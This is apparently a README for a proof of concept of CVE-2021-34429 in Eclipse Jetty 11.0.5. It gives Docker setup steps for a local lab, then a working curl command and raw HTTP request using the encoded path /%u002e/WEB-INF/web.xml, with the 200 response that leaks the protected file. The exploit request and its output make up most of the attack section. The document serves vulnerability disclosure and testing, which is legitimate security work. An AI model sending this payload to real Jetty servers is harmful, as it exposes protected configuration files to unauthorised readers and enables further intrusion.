# CVE-2021-34429
POC for CVE-2021-34429 - Eclipse Jetty 11.0.5 Sensitive File Disclosure

## Using Encoded URIs to access files inside WEB-INF directory

#### Setting up the testing Environment

Prequistics: Installing docker and docker-compose on your system

For debain based distros ex. Ubuntu, Kali Linux etc. use the following commands

```
apt install docker.io
apt install docker-compose
```
For Windows,mac and other distros please refer the following guides:

- https://docs.docker.com/engine/install/
- https://docs.docker.com/compose/install/

### Installing Eclipse Jetty 11.0.5 

- Clone or download the repository
- run `docker-compose up -d`
- Your webserver should be up & running on `http://localhost:8080/`

![home](https://raw.githubusercontent.com/ColdFusionX/CVE-2021-34429/main/home.png)

## Vulnerablitiy Test

Make a GET request to `http://localhost:8080/%u002e/WEB-INF/web.xml`

- `curl -v 'localhost:8080/%u002e/WEB-INF/web.xml'`

### Request

```shell
GET /%u002e/WEB-INF/web.xml HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

### Response

```shell
HTTP/1.1 200 OK
Connection: close
Last-Modified: Wed, 03 Nov 2021 08:25:24 GMT
Content-Type: application/xml
Accept-Ranges: bytes
Content-Length: 209
Server: Jetty(11.0.5)

<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app>
<display-name>ColdFusionX - Web Application</display-name>
</web-app>
```

#### References:
- https://nvd.nist.gov/vuln/detail/CVE-2021-34429
- https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm

